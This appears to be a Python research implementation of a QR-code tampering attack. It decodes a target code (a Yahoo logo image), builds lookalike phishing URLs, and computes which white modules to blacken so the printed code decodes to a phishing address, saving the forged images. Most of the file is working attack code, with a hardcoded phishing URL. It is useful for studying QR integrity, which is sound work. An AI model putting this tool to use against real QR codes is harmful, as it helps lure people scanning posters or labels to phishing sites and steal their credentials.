from qrcodegen import *
import numpy as np
from pyzbar.pyzbar import decode
from PIL import Image
import os
import multiprocessing as mp
# import threading
# import concurrent.futures
import time
from concurrent.futures import ProcessPoolExecutor

import qr
import url

def generate_malicious_qr(image_path):
    # 1. Scan the QR code (Q0) with a mobile device capable of decoding QR codes
    # and re- trieve the corresponding Message M0.
    # For the rest of the paper we assume that M0 is a URL to a website.

    try:
        m0 = qr.decode_qr_image(image_path)
    except:
        return "Error reading from " + image_path

    print("m0: ", m0)
    #m0 = m0.decode("utf-8")

    # TODO: verify URL
    if not url.is_valid_url(m0):
        return "Not a valid URL"

    # TODO: make this more efficient:
    start_qr_info = time.time()
    ecc, version, mask = qr.get_qr_info(image_path)
    print("Time to find QR info: ", time.time() - start_qr_info)

    q0 = qr.generate_qr_code(m0, ecc, version, mask)


    # 2. Generate several messages Mi, i = 1,...,n, that contain URLs to possible
    # phishing sites (the new messages are generated in a way to make them look
    # similar to the origi- nal one, e.g. by systematically changing characters
    # in the original URL).
    start_m = time.time()
    print("Generating messages...")
    messages = ['http://yghqo.at']#url.generate_similar_urls(m0, 100000, True, True)
    print("Finished in: ", time.time() - start_m)

    # 3. Generate the corresponding QR codes Qi for the messages Mi, i = 1,...,n.
    # The new QR codes should use the same version and mask as the original QR code,
    # so no changes in these regions of the Code need to be done.
    start_q = time.time()
    print("Generating QR codes...")
    qr_codes = [qr.generate_qr_code(message, ecc, version, mask) for message in messages]
    print("Finished in: ", time.time() - start_q)

    # 4. Construct the symmetric difference Di of the generated QR code to the original,
    # for each q_i in qr_codes
    start_s = time.time()
    print("Constructing symmetric differences...")
    symmetric_diffs = [symmetric_diff(q0, q_i) for q_i in qr_codes]
    print("Finished in: ", time.time() - start_s)

    # 5. Calculate the ratios ri of modules in the symmetric differences that
    # indicate a change from white to black
    start_sd = time.time()
    print("Calculating ratios...")
    symmetric_diff_ratios = [calculate_difference_ratio(sd) for sd in symmetric_diffs]
    print("Finished in: ", time.time() - start_sd)

    # 6. Order the QR codes by ratio ri, descending. Codes where the number of codewords
    # (not modules) that need to get changed from black to white is higher than the error-
    # correcting capacity of the code can be omitted
    start_o = time.time()
    print("Ordering codes...")
    ordered_codes = order_codes_by_ratio(qr_codes, symmetric_diff_ratios, ecc)
    print("Finished in: ", time.time() - start_o)

    # 7. Start with the first QR code Q1 (now sorted) and color white modules of Q0 that are black in Q1 black.
    # Check after every module, whether the meaning of the QR code can be decoded
    # and results in a different message than the original. Repeat this until a valid
    # coloring is found (for the first b elements the check can be omitted,
    # where b denotes the number of errors the BCH-encoding is capable of correcting plus one.
    # If the resulting code Q_i can get decoded to message Mi, a solution was found.
    image_name = os.path.basename(image_path)
    start_verify = time.time()
    print("Verifying solutions...")
    valid_codes = verify_solution(q0, m0, ordered_codes, image_name)
    print("Finished in: ", time.time() - start_verify)
    print("valid codes: ", valid_codes)

    # 8. The last step can be repeated for all Qi where the number of black
    # modules in the symmetric difference Di is greater than the number of errors
    # that can be corrected by the BCH-encoding (b).

    # TODO

    return valid_codes

def symmetric_diff(qr_0, qr_i):
    """Calculates symmetric difference between 2 QR codes

    Symmetric difference is the set of modules that are different colors at the
    same position on both QrCodes q_0 and q_i

    Args:
        qr_0: A QrCode object of size nxn
        qr_i: A QrCode object also of size nxn
    Returns:
        A list diffs of two lists of tuples that represent (x,y) positions on
        the qr odes. The first list diffs[0] contains tuples representing
        all of the positions where the qr_0 module was white and qr_i module
        was black, while the second list diffs[1] contains tuples representing
        the opposite: positions where qr_0 was black and qr_i was white. All
        (x,y) pairs in range (n,n) not included in either list are the same
        color in both qr_0 and qr_i.
    """
    symmetric_diffs = [[],[]]
    for y in range(qr_0.get_size()):
        for x in range(qr_0.get_size()):
            qr_0_color = qr_0.get_module(x, y)
            qr_i_color = qr_i.get_module(x, y)
            if qr_0_color != qr_i_color:
                symmetric_diffs[qr_0_color].append((x,y)) # make sure black/white interpretation is correct here linds!
    return symmetric_diffs

def calculate_difference_ratio(symmetric_diffs):
    """Calculates ratio of size of symmetric_diff[0] to total elems in symmetric_diff

    From two lists of unique length-2 tuples of integers that do not overlap,
    calculates the ratio of the number of elements in the first list to the
    total number of elements included in both lists.

    Args:
        symmetric_diff: A list containing two lists of unique length-2 tuples
        of integers that do not overlap
    Returns:
        the ratio of the first list length to length of the combined lists
        if both lists are empty, returns 1
    """
    combined_lists = [pair for sublist in symmetric_diffs for pair in sublist]
    return len(symmetric_diffs[0])/len(combined_lists)

def order_codes_by_ratio(qr_codes, symmetric_diff_ratios, ecc):
    """Order qr_codes by symmetric_diff ratio r_i in descending order

    Args:
        qr_codes: list of QrCode objects
        symmetric_diff_ratios: list of ratios r_i
        ecc: error correction capacity of target QR code
    Returns:
        A list of ordered QrCode objects
    """

    # order qr_codes by symmetric_diff_ratios in descending order
    zipped = zip(symmetric_diff_ratios, qr_codes)
    ordered = [(ri, qr_code) for ri, qr_code in sorted(zipped, key = lambda x: x[0], reverse=True)]

    # omit qr codes where r_i is less than the error correcting capacity of target qr code
    ecc = qr.get_ecc_level_value(ecc)
    valid = []
    for (ri, qr_code) in ordered:
        if ri >= ecc:
            valid.append(qr_code)
    return valid

def is_code_valid(args):
    q0, m0, qi, image_name = args
    rgb = qr.qr_matrix_rgb(qi)
    # color white modules of Q0 that are black in Q1 black. (element wise OR)
    qx = qr.qr_matrix(qi)
    #qr.qr_matrix_image(qx, './tests/malicious/qx_' + str(i) + '.png')
    dx = np.logical_xor(q0, qx)
    #qr.qr_matrix_image(dx, './tests/malicious/dx_' + str(i) + '.png')
    rx = np.logical_and(qx, dx)
    #qr.qr_matrix_image(rx, './tests/malicious/rx_' + str(i) + '.png')
    qx_prime = np.logical_or(q0, rx)
    #qr.qr_matrix_image(qx_prime, './tests/malicious/qx_prime_yahoo_' + str(i) + '.png')

    diff = qr.qr_diff(q0, qx_prime)
    #qr.qr_matrix_image(diff, './tests/malicious/diff_' + str(i) + '.png')

    # Check after every module, whether the meaning of the QR code can be decoded
    # and results in a different message than the original.
    decoded = qr.decode_qr_matrix(qx_prime)
    if not decoded:
        return
    if decoded != m0:
        qr.qr_matrix_image(qx_prime, 'tests/malicious/' + image_name)
        return decoded

def verify_solution(q0, m0, ordered_qr_codes, image_name):
    """

    Args:
        q0: a QrCode object
        m0: the message in q0
        ordered_qr_codes: a list of QrCode objects produced by order_codes_by_ratio()
    Returns:
        A list of valid QR code matrices
    """
    # 7. Start with the first QR code Q1 (now sorted) and color white modules of Q0 that are black in Q1 black.
    # Check after every module, whether the meaning of the QR code can be decoded
    # and results in a different message than the original. Repeat this until a valid
    # coloring is found (for the first b elements the check can be omitted,
    # where b denotes the number of errors the BCH-encoding is capable of correcting plus one.
    # If the resulting code Q_i can get decoded to message Mi, a solution was found.
    # In step seven, the following optimization can be used:
    # Instead of coloring module by module, we simply change all modules that can be
    # changed by only using black color at once and thus generate Q_x by applying
    # the fast and simple element-wise OR-function: Q_x = Q0 OR Rx, (OR = element-wise OR)
    # Q0 = target code,
    # Q_x = generated code,
    # Rx = Qx AND Dx (AND = element-wise AND)
    # Dx = Q0 XOR Qx,
    # Qx = code in qr_codes

    q0 = qr.qr_matrix(q0)

    decoded = qr.decode_qr_matrix(q0)

    workers = 5

    args = [(q0, m0, qi, image_name) for qi in ordered_qr_codes]

    with ProcessPoolExecutor(workers) as ex:
        res = ex.map(is_code_valid, args)
    res = list(res)

    #valid_codes = [is_code_valid(q0, m0, qi) for qi in ordered_qr_codes]
    # with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
    #     futures = []
    #     for qi in ordered_qr_codes:
    #         futures.append(executor.submit(is_code_valid, q0, m0, qi))
    #     for future in concurrent.futures.as_completed(futures):
    #         valid_codes.append(future.result())
    #
    return [code for code in res if code]

if __name__ == '__main__':
    generate_malicious_qr('./tests/target/yahoo.png')
